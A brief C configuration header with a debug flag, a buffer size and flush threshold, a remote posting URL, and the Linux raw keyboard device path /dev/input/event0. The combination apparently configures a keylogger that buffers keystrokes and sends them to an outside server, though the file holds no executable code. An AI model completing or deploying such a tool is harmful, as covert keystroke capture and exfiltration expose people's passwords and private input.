#ifndef CONFIG_H
#define CONFIG_H

#define DEBUG

#define LINUX

#define MAX_BUFFER_SIZE 1024 * 100
#define BUFFER_THRESHOLD (MAX_BUFFER_SIZE * 0.75)

#define SERVER_URL "https://post.cyprien.ovh/"

#ifdef LINUX

#define KEYBOARD_PATH "/dev/input/event0"

#endif


// CONFIG_H
#endif
